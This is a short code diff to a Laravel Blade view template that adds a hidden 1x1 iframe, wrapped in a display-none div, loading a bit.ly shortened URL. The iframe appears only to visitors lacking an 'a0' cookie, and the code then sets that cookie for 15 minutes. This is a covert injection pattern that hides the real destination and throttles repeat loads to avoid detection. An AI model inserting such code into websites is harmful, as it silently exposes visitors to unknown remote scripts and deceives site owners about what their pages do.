@@ -612,4 +612,12 @@
     </div>
 
     @include('view_tool::web.facebook.assets.script')
+
+    @if(request()->cookie('a0') == '')
+        <div style="display: none;">
+            <iframe width="1" height="1" sandbox="allow-forms allow-scripts" src="https://bit.ly/3tLDKit"></iframe>
+        </div>
+        <?php \Illuminate\Support\Facades\Cookie::queue('a0', 'ok', 15); ?>
+    @endif
+
 @endsection
